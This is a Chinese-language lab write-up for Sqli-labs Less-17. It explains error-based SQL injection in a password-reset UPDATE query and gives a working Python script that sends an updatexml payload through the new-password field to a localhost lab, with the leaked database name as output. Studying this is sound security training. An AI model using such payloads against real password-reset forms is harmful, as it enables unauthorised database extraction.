## 题目: Sqli-labs Less-17

## 题目描述
本关页面变为了“密码重置”功能（PASSWORD RESET），包含 `User Name` 和 `New Password` 两个输入框。页面标题为 `UPDATE Query- Error Based - String`。

## 解题思路
与之前的 SELECT 查询不同，本关后端执行的 SQL 语句是 `UPDATE users SET password='$passwd' WHERE username='$uname'`。
核心难点在于：**后台代码在执行 UPDATE 之前，会先对 `uname` 字段进行严格的验证（如查询用户是否存在）。如果我们在 `uname` 中注入，会导致查询失败，代码直接退出，根本无法执行到报错语句。**

因此，我们必须“声东击西”：给 `uname` 传入一个真实存在的用户（如 `admin`）以通过校验，然后将恶意的报错 Payload 注入到 `passwd`（New Password）字段中。

## 解题步骤
**1. 编写 UPDATE 报错注入脚本**

**实战 Payload 核心代码**：

```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-17/"

# uname 必须真实存在
# passwd 字段使用单引号闭合，并注入 updatexml
payload_passwd = "1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #"

data = {
    'uname': 'admin',
    'passwd': payload_passwd,
    'submit': 'Submit'
}

print("正在执行 Less-17 密码重置处的报错注入...")
r = requests.post(url, data=data)

print("\n============== 寻找报错信息 ==============")
for line in r.text.split('\n'):
    if "XPATH" in line or "error" in line.lower():
        print(line.strip())
```
**2. 运行结果**
成功利用 `updatexml` 的报错，爆出当前数据库名：

```text
XPATH syntax error: '~security~'
```

## 知识点总结
* UPDATE 注入：与 SELECT 注入不同，UPDATE 语句的注入点通常在后半部分（如 SET 或 WHERE 中）。必须确保前半部分的逻辑（如用户存在性检查）能够通过。
* 报错函数的限制：updatexml 函数回显的内容有长度限制（约 32 个字符），如果想爆出全部账号密码，需要使用 substr 结合偏移量进行分段读取，或者使用 extractvalue。
* 防御策略：使用 PDO 预编译；不要在 SQL 中拼接用户输入。
